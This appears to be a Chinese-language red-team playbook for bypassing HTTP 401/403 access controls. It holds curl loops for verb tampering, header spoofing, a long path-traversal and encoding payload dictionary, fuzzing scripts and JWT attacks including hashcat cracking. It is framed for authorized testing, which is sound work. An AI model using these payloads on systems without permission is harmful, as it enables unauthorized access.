# 401/403 绕过（分层判定 / 动词 / 头部 / 路径）
> 护网使用：授权、ROE、留痕、报告见 `../hw-rules/`。

---


## 403 Forbidden 绕过实战参考

> 分类: 分层判定 → 动词/头部 → 路径混淆 → 参数与令牌 → 备用入口 → 字典
> 定位: 利用阶段通用技巧（与 `waf-bypass.md` 同级）

---

## 0. 先判定：403 是哪一层返回的

**绕过手法完全取决于拦截层，别上来就甩 payload。** 用响应特征区分：

| 响应特征                                | 拦截层                 | 主攻方向                               |
| --------------------------------------- | ---------------------- | -------------------------------------- |
| 403 +`Server: nginx` 短页、无应用特征 | 反代/WAF 规则          | §2 头部 + §3 路径混淆                |
| 403 + 应用完整页面模板/导航             | 应用 ACL（有会话）     | §2.1 覆盖头 + §4 参数 + §5 备用入口 |
| 403 +`Server: Apache`、目录列表关闭   | 文件/目录权限          | §5 备用入口（换端口/子域）            |
| 403 仅对特定 IP 段                      | IP 白名单              | §2.2 IP 伪造头                        |
| 403 仅对特定 UA                         | UA 拦截                | §2.3 UA/Referer 伪造                  |
| 200 但内容为空/截断                     | WAF 内容过滤（非 403） | 转 `waf-bypass.md`               |

**判定命令：**

```bash
# 对比不同路径深度的响应，确认是路径规则还是全局拦截
curl -sk -o /dev/null -w '%{http_code} %{size_download}\n' https://<target>/admin
curl -sk -o /dev/null -w '%{http_code} %{size_download}\n' https://<target>/admin/nonexistent-xyz
curl -sk -o /dev/null -w '%{http_code} %{size_download}\n' https://<target>/random-nonexistent-xyz

# 3 个都 403 → 全局拦截（IP/UA/WAF）→ 走 §2
# 仅 /admin 403，其余 404 → 路径规则 → 走 §3
# 响应体长度不同 → 拦截层不同 → 逐个对比
```

> ⚠️ 拿到 200 后先确认**返回的是真实内容而非软 404 或登录页**——大小比对或 grep 特征串。

---

## 1. HTTP 动词篡改

访问控制常只挂在 `GET`/`POST` 上。动词放行差异是最高频的 403 成因。

```bash
# 逐个试（--path-as-is 阻止 curl 规范化路径，不是必需品但避免干扰）
for m in GET POST PUT PATCH DELETE HEAD OPTIONS TRACE CONNECT PROPFIND MKCOL COPY MOVE LOCK UNLOCK SEARCH; do
  printf '%-10s ' "$m"
  curl -sk -X "$m" --path-as-is -o /dev/null -w '%{http_code}\n' https://<target>/admin
done
```

**要点：**

- `OPTIONS` 先探 `Allow:` 头 → 拿到服务端声明支持的方法集，再针对性打
- `TRACE` 有反射风险（XST），但现代服务多关闭
- WebDAV 动词（`PROPFIND`/`MKCOL`/`COPY`/`MOVE`/`LOCK`）在启用 WebDAV 的 IIS/Apache 上常穿透 ACL
- 自定义动词（`FAKE`/`FOO`）某些 WAF 不认识 → 透传后端，后端按 `GET` 处理
- 动词覆盖头：前端认 `GET`、后端认 `POST` 的错配

> **原文提示**：Burp Suite 的 Intruder 可把这批方法做成 payload 列表批量跑，比 for 循环更易看响应差异对比。

```http
GET /admin HTTP/1.1
Host: <target>
X-HTTP-Method-Override: POST
```

---

## 2. 头部伪造

### 2.1 路径覆盖头（反代/WAF 场景首要尝试）

反代按 `X-Original-URL` / `X-Rewrite-URL` 重写路径时，ACL 若作用在原始 URI 上即可绕过：

```bash
curl -sk -H 'X-Original-URL: /admin' https://<target>/some-page
curl -sk -H 'X-Rewrite-URL: /admin'  https://<target>/some-page
curl -sk -H 'X-Original-URL: /admin' -H 'X-Rewrite-URL: /admin' https://<target>/some-page
```

变体：`X-Override-URL` / `X-Forwarded-Path` / `X-HTTP-DestinationURL` / `Request-Uri` / `Uri`。

### 2.2 IP 伪造头（IP 白名单 / 内网信任场景）

后端从这些头取"真实 IP"并按内网放行时有效。**逐个试，不要一次全发**——全发会被某些 WAF 直接判定为攻击。

```bash
for h in X-Forwarded-For X-Real-IP X-Client-IP X-Originating-IP \
         X-Remote-Addr X-Remote-IP X-Forwarded-Host X-Host \
         X-Custom-IP-Authorization X-True-IP X-Proxy-Url X-Original-Remote-Addr; do
  printf '%-28s ' "$h"
  curl -sk -H "$h: 127.0.0.1" -o /dev/null -w '%{http_code}\n' https://<target>/admin
done
```

IP 取值阶梯（同一头依次换值）：

```
127.0.0.1        本机信任
127.0.0.1:80     带端口
::1              IPv6 本机
localhost        名字形式
10.0.0.1        内网 A 段
172.16.0.1      内网 B 段
192.168.1.1     内网 C 段
```

链式取值（部分实现取最后一个或第一个非可信地址）：

```bash
-H 'X-Forwarded-For: 127.0.0.1, 1.2.3.4, 10.0.0.1'
-H 'X-Forwarded-For: 8.8.8.8, 127.0.0.1'
```

**换出口 IP（IP 黑名单而非白名单场景）**：

```bash
proxychains curl http://<target>/private/
```

> 适用场景与头部伪造不同：头伪造骗的是"后端从头部取 IP"的应用逻辑；换出口 IP 骗的是"在网关/防火墙层按真实源 IP 拦截"的策略。两者都要试。

### 2.3 UA / Referer 伪造

```bash
# 真实浏览器 UA（拦 Burp/curl 特征时有效）
curl -sk -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36' https://<target>/admin

# Referer 指向同站可信页（拦"无来源/外站来源"时有效）
curl -sk -e 'https://<target>/index' https://<target>/admin
curl -sk -e 'https://<target>/admin/../index' https://<target>/admin
```

### 2.4 Host 头绕过

```bash
# 删掉 Host（HTTP/1.0）→ 部分反代回退到 localhost
curl -sk --http1.0 https://<target>/admin   # 注意 --http1.0，不是 -http1.0

# 双 Host
printf 'GET /admin HTTP/1.1\r\nHost: <target>\r\nHost: 127.0.0.1\r\n\r\n' | \
  openssl s_client -quiet -connect <target>:443 2>/dev/null | head -20

# Host 变形（前端/后端解析不一致）
-H 'Host: 127.0.0.1'
-H 'Host: localhost'
-H 'Host: <target>:80@127.0.0.1'
-H 'Host: 127.0.0.1#<target>'
```

> HTTPS 注意 SNI：改 Host 头不代表改 SNI。SNI 与 Host 不一致时部分反代会直接 403——用 `--resolve` 拆分。
> 另见 `http-protocol.md`（投毒方向）。

---

## 3. 路径混淆与编码

**前提：`curl` 必须带 `--path-as-is`，否则 curl 会自行规范化路径，测试无意义。**

### 3.1 路径变形速查

| 手法            | 示例                                                                   | 作用                                   |
| --------------- | ---------------------------------------------------------------------- | -------------------------------------- |
| 尾斜杠          | `/admin/`                                                            | 绕过精确匹配 `/admin` 的规则         |
| 分号路径参数    | `/admin;foo=bar`                                                     | 前后端解析不一致（Spring/Tomcat 尤甚） |
| 分号 + 斜杠     | `/admin/..;/` `/..;/admin`                                         | 路径混淆经典                           |
| 双斜杠          | `//admin//`                                                          | 绕过规范化规则                         |
| 点结尾          | `/admin.` `/admin..`                                               | 骗过粗糙正则；部分系统截断             |
| 尾空格/编码空格 | `/admin%20` `/admin%09`                                            | 解析器差异                             |
| 尾分号          | `/admin;` `/admin;/`                                               | 同上                                   |
| 反斜杠          | `\admin` `/admin\/`                                                | Windows/IIS 解析器差异                 |
| 大小写          | `/Admin` `/ADMIN` `/aDmiN`                                       | 大小写敏感的后端                       |
| 加扩展名        | `/admin.json` `.css` `.html` `.php` `.bak` `.old` `.zip` | 路由/静态资源规则差异                  |
| 加查询/片段     | `/admin?x=1` `/admin#` `/admin?`                                 | 仅按 path 检查的规则                   |

```bash
T=https://<target>
for p in '/admin/' '/admin;foo=bar' '/admin/..;/' '/..;/admin' '//admin//' \
         '/admin.' '/admin..' '/admin%20' '/admin%09' '/admin;' '/admin;/' \
         '\admin' '/Admin' '/ADMIN' '/admin.json' '/admin.css' '/admin.php' \
         '/admin.bak' '/admin.old' '/admin?x=1' '/admin?' '/admin#'; do
  printf '%-18s ' "$p"
  curl -sk --path-as-is -o /dev/null -w '%{http_code}\n' "$T$p"
done
```

### 3.2 点段与编码

```bash
curl -sk --path-as-is "https://<target>/%2e%2e/admin"        # ../admin
curl -sk --path-as-is "https://<target>/%2e%2e%2fadmin"      # ../admin 斜杠也编码
curl -sk --path-as-is "https://<target>/%2e%2e/%2fadmin"     # ..//admin 混合编码
curl -sk --path-as-is "https://<target>/%2e%2e%2f%61dmin"    # 再编码 'a'
curl -sk --path-as-is "https://<target>/%2e%2e/%2e%2e/admin" # ../../admin 多级
curl -sk --path-as-is "https://<target>/admin%2f"            # admin/
curl -sk --path-as-is "https://<target>/admin%252f"          # 双重编码 admin%2f
curl -sk --path-as-is "https://<target>/%2e%2fadmin"         # ./admin
curl -sk --path-as-is "https://<target>/admin%2e%2e%2f"      # admin../
curl -sk --path-as-is "https://<target>/%252e%252e%252fadmin" # 三重编码
curl -sk --path-as-is "https://<target>/%20/admin"           # 空格段
curl -sk --path-as-is "https://<target>/../admin/"           # --path-as-is 原样发送（不加则被规范化为 /admin/）
```

### 3.3 Unicode / 非 ASCII 斜杠

后端做 Unicode 归一化、前端不归一化时，可用同形字符替代斜杠：

```bash
curl -sk --path-as-is "https://<target>/admin%c0%af"          # 过时 UTF-8 斜杠
curl -sk --path-as-is "https://<target>/admin%ef%bc%8f"       # 全角斜杠 ／
curl -sk --path-as-is "https://<target>/%e2%88%95admin"       # ∕ (U+2215)
curl -sk --path-as-is "https://<target>/%e2%88%b6admin"       # ∖ (U+2216)
```

### 3.4 空字节截断

对**老版本 PHP（<5.3.4）** 和部分 C 实现的路径处理有效，现代环境基本已修：

```bash
curl -sk --path-as-is "https://<target>/admin.php%00.html"
curl -sk --path-as-is "https://<target>/admin%00.php"
curl -sk --path-as-is "https://<target>/config.php%00.json"
curl -sk --path-as-is "https://<target>/login.php%00?redirect=admin"
curl -sk --path-as-is "https://<target>/user/profile%00.php"
curl -sk --path-as-is "https://<target>/images/logo%00.jpg"
curl -sk --path-as-is "https://<target>/secret%00file.txt"
curl -sk --path-as-is "https://<target>/uploads/file%00.zip"
```

### 3.5 路径变体字典

237 条路径变体全部保留如下。**不要盲跑全量**——先按 §0 判定拦截层再选集，全量是 237 次请求。

```
#
#?
%09
%09%3b
%09..
%09;
%20
%23
%23%3f
%252f%252f
%252f/
%2e%2e
%2e%2e/
%2f
%2f%20%23
%2f%23
%2f%2f
%2f%3b%2f
%2f%3b%2f%2f
%2f%3f
%2f%3f/
%2f/
%2f;?
%2f?;
%3b
%3b%09
%3b%2f%2e%2e
%3b%2f%2e%2e%2f%2e%2e%2f%2f
%3b%2f%2e.
%3b%2f..
%3b/%2e%2e/..%2f%2f
%3b/%2e.
%3b/%2f%2f../
%3b/..
%3b//%2f../
%3f%23
%3f%3f
%3f.php
..
..%00/
..%00/;
..%00;/
..%09
..%0d/
..%0d/;
..%0d;/
..%5c/
..%ff/
..%ff/;
..%ff;/
../
..;%00/
..;%0d/
..;%ff/
..;\
..;\;
..\
..\;
.html
.json
/
/#
/%20
/%20#
/%20%23
/%23
/%252e%252e%252f/
/%252e%252e%253b/
/%252e%252f/
/%252e%253b/
/%252e/
/%252f
/%2e%2e
/%2e%2e%2f/
/%2e%2e%3b/
/%2e%2e/
/%2e%2f/
/%2e%3b/
/%2e%3b//
/%2e/
/%2e//
/%2f
/%3b/
/..
/..%2f
/..%2f..%2f
/..%2f..%2f..%2f
/../
/../../
/../../../
/../../..//
/../..//
/../..//../
/../..;/
/.././../
/../.;/../
/..//
/..//../
/..//../../
/..//..;/
/../;/
/../;/./
/..;%2f
/..;%2f..;%2f
/..;%2f..;%2f..;%2f
/..;/
/..;/./
/..;/..;/
/..;//
/..;//../
/..;//..;/
/..;/;/
/..;/;/..;/
/./
/.//
/.;/
/.;//
//
//..
//../../
//..;
//./
//.;/
///..
///../
///..//
///..;
///..;/
///..;//
//;/
/;/
/;//
/;?
/;x
/;x/
/?
/?;
/x/../
/x/..//
/x/../;/
/x/..;/
/x/..;//
/x/..;/;/
/x//../
/x//..;/
/x/;/../
/x/;/..;/
;
;%09
;%09..
;%09..;
;%09;
;%2F..
;%2f%2e%2e
;%2f%2e%2e%2f%2e%2e%2f%2f
;%2f%2f/../
;%2f..
;%2f..%2f%2e%2e%2f%2f
;%2f..%2f..%2f%2f
;%2f..%2f/
;%2f..%2f/..%2f
;%2f..%2f/../
;%2f../%2f..%2f
;%2f../%2f../
;%2f..//..%2f
;%2f..//../
;%2f..///
;%2f..///;
;%2f..//;/
;%2f..//;/;
;%2f../;//
;%2f../;/
;%2f../;/;/
;%2f../;/;/;
;%2f..;///
;%2f..;//;/
;%2f..;/;//
;%2f/%2f../
;%2f//..%2f
;%2f//../
;%2f//..;/
;%2f/;/../
;%2f/;/..;/
;%2f;//../
;%2f;/;/..;/
;/%2e%2e
;/%2e%2e%2f%2f
;/%2e%2e%2f/
;/%2e%2e/
;/%2e.
;/%2f%2f../
;/%2f/..%2f
;/%2f/../
;/.%2e
;/.%2e/%2e%2e/%2f
;/..
;/..%2f
;/..%2f%2f../
;/..%2f..%2f
;/..%2f/
;/..%2f//
;/../
;/../%2f/
;/../../
;/../..//
;/.././../
;/../.;/../
;/..//
;/..//%2e%2e/
;/..//%2f
;/..//../
;/..///
;/../;/
;/../;/./
;/..;
;/.;.
;//%2f../
;//..
;//../../
;///..
;///../
;///..//
;?
;x
;x/
;x;
?
?#
?.php
?;
??
///
/%2f/
//%2f
%2f/%2f
%2f%2f%2f
%2f//
```

> 编码层面重叠较多（归一化解码后塌缩为 133 种形态），但**没有字面重复**——保留全集是为了不漏掉字节级变体（`%ff`/`%5c`/`%0d`、多级 `../` 嵌套等）。

### 3.6 生成式补充 Fuzz（覆盖不全，仅作补充）

前缀×分隔符×后缀的笛卡尔积，**产出 455 条但只覆盖 §3.5 的 35/133 种形态（26.3%）**。它是**补充而非超集**——产不出多级 `../` 嵌套、`%ff`/`%5c` 字节变体、`.html`/`.json` 后缀等。仅在 §3.5 字典跑完后、想扩大探索面时使用。

```bash
T=https://<target>; P=/admin
pre=( '' '.' '..' '..;' '~' '%2e' '%2e%2e' '%252e%252e' )
mid=( '/' '' '%2f' '%252f' ';/' ';%2f' '//' '/;/' '%09' '%0d' '%00' )
suf=( '' '/' '%2f' ';' '%20' '%09' '%23' '%3f' '?' '#' '..' '..;' '%2e' '.' )
for a in "${pre[@]}"; do for b in "${mid[@]}"; do for c in "${suf[@]}"; do
  u="$P$a$b$c"
  code=$(curl -sk --path-as-is -o /dev/null -w '%{http_code}' "$T$u")
  [ "$code" != "403" ] && [ "$code" != "404" ] && printf '%-30s %s\n' "$u" "$code"
done; done; done
```

> 该循环 8×11×14 = 1232 次请求。**先确认目标能承受该频率**，必要时降速或分批。

---

## 4. 参数篡改与令牌

### 4.1 附加良性参数

安全规则只作用于 path、忽略 query 时有效：

```bash
# 原文逐字
curl -sk "https://<target>/admin?unused_param=1"
curl -sk "https://<target>/admin?redirect=allowed"
curl -sk "https://<target>/admin?debug=true"
curl -sk "https://<target>/admin?access=granted"
curl -sk "https://<target>/admin?token=123"

# 补充变体
curl -sk "https://<target>/admin?unused=1"
curl -sk "https://<target>/admin?"      # 裸 ?
```

### 4.2 HPP 参数污染

同名参数前后端取值不一致 → 绕过基于单参数值的判定：

```bash
curl -sk "https://<target>/admin?id=1&id=2"
curl -sk "https://<target>/admin?role=user&role=admin"
```

各栈取值：PHP/Apache 取**最后**；JSP/Tomcat 取**第一**；ASP.NET 拼接为 `1,2`；Node 变数组。详见 `waf-bypass.md §4`。

### 4.3 协议与版本降级

```bash
# HTTP/1.0 降级（原文在 4 个受限路径上各试一遍——ACL 可能只挂某一层）
curl -sk --http1.0 https://<target>/admin
curl -sk --http1.0 https://<target>/secret
curl -sk --http1.0 https://<target>/config
curl -sk --http1.0 https://<target>/dashboard

# HTTP/1.1 对照
curl -sk --http1.1 https://<target>/admin

# HTTP/HTTPS 切换（ACL 按协议配置时有效）
curl -sk http://<target>/admin
curl -sk https://<target>/admin
```

### 4.4 JWT 令牌篡改

仅在**同时满足**"已有有效 JWT"且"签名校验有缺陷"时可用。

**逐项测试（现代框架前两项基本已修）：**

```
1. alg:none      — 把 header 的 alg 改 none、去掉签名          → 老框架/JWT<0.3 才有
2. 签名剥离      — 保留 header.payload 去掉第三段              → 同上
3. 算法混淆      — 用公钥当 HMAC 密钥签 RS256→HS256 的 token   → 配置错误时有效
4. 弱密钥爆破    — 用 hashcat 暴破 HS256 密钥
   hashcat -m 16500 jwt.txt rockyou.txt
5. kid 注入      — kid 指向可控文件/路径穿越/SQLi
6. jwk/jku 注入  — header 里塞自己的公钥
7. 声明篡改      — role/user→admin、sub 换 ID（无签名校验时）
```

```bash
# 解码（不改动、不上传第三方——用本地脚本）
python -c "
import base64,json,sys
t=sys.argv[1].split('.')
for p in t[:2]:
    print(json.loads(base64.urlsafe_b64decode(p+'='*(-len(p)%4))))
" '<JWT>'

# 替换后重放
curl -sk -H "Authorization: Bearer <MODIFIED_JWT>" https://<target>/adminarea
```

> 按 CLAUDE.md 安全红线：**不要把真实 JWT 贴到 jwt.io 等第三方站点**。本地解码。

---

## 5. 备用入口（非"绕过"，而是绕开）

同一应用常在别处暴露同样端点，且那些入口的 ACL 配置往往更松：

```bash
https://admin.<target>/admin      # 管理子域
https://dev.<target>/admin        # 开发环境（ACL 常年缺失）
https://test.<target>/admin
https://<target>:8080/admin       # 非标端口
https://<target>:8443/admin
https://<target>:8000/admin
http://<target>:80/admin          # 明文本端口
```

配套动作：

- 子域枚举 → `../recon/info-subdomain.md`
- 端口扫描 → `../recon/info-port-scan.md`
- C 段/同 ASN 关联 → `资产测绘` skill

**Wayback 取旧快照**——403 的端点过去可能公开，快照里可能残留管理页结构、参数名、甚至凭据：

```bash
curl -sk "http://archive.org/wayback/available?url=<target>/admin"
curl -sk "http://web.archive.org/cdx/search/cdx?url=<target>/*&output=text&fl=original&collapse=urlkey&limit=500"
```

> Wayback 属**侦察**而非绕过：它不给你当前访问权，但能暴露"过去未受保护"的东西——历史凭据、参数名、隐藏路径。拿到线索后回 §1–§4 针对当前环境再试。

---

## 6. 头部字典（全量，逐条单发）

```
Base-Url: 127.0.0.1
Client-IP: 127.0.0.1
Http-Url: 127.0.0.1
Proxy-Host: 127.0.0.1
Proxy-Url: 127.0.0.1
Real-Ip: 127.0.0.1
Redirect: 127.0.0.1
Referer: 127.0.0.1
Referrer: 127.0.0.1
Refferer: 127.0.0.1
Request-Uri: 127.0.0.1
Uri: 127.0.0.1
Url: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Port: 443
X-Forwarded-Port: 4443
X-Forwarded-Port: 80
X-Forwarded-Port: 8080
X-Forwarded-Port: 8443
X-Forwarded-Scheme: http
X-Forwarded-Scheme: https
X-Forwarded-Server: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarder-For: 127.0.0.1
X-Host: 127.0.0.1
X-Http-Destinationurl: 127.0.0.1
X-Http-Host-Override: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Proxy-Url: 127.0.0.1
X-Real-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Rewrite-Url: 127.0.0.1
X-True-IP: 127.0.0.1
```

> 路径覆盖类（`X-Original-Url`/`X-Rewrite-Url`/`X-Override-URL`）的值应为**受保护路径**（如 `/admin`），不是 IP。字典里给 `127.0.0.1` 是就"取内网信任"这一分支而言；按 §0 判定结果二选一。

```bash
# 字典批量跑
T=https://<target>/; P=admin
while IFS= read -r h; do
  [ -z "$h" ] && continue
  printf '%-32s ' "$h"
  curl -sk -H "$h" -o /dev/null -w '%{http_code}\n' "$T$P"
done < headers.txt
```

---

## 7. 执行顺序建议

```
§0 判定拦截层
 ├─ IP/UA 类 → §2.2 / §2.3 → §5
 ├─ 反代路径规则 → §2.1 → §3.1 → §3.2
 └─ 应用 ACL → §1 动词 → §2.1 覆盖头 → §4 参数 → §5 备用入口
      ↑ 每层都先发一次基线请求，记录 状态码/长度/特征串，再对比
```

**记录纪律**（按 CLAUDE.md）：每条尝试记录 `手法 → 状态码 → 响应长度 → 是否拿到真实内容`。WAF 拦截时记录尝试过的绕过手法与结果。

---


---

## 补充与进阶

## 401-403-bypass（禁开磨登录 HTML）

> 打开是登录页 / SSO → 表单壳听 `../hw-rules/workflow.md` §4.1.1，**不要**按本文件磨登录 HTML。发会话 / 重置 / 改绑 / 换票走 §4.2.2 + `auth-idor.md`。业务 API 的 401/403：现场改 path / METHOD / 头自己打，不靠本篇英文 checklist。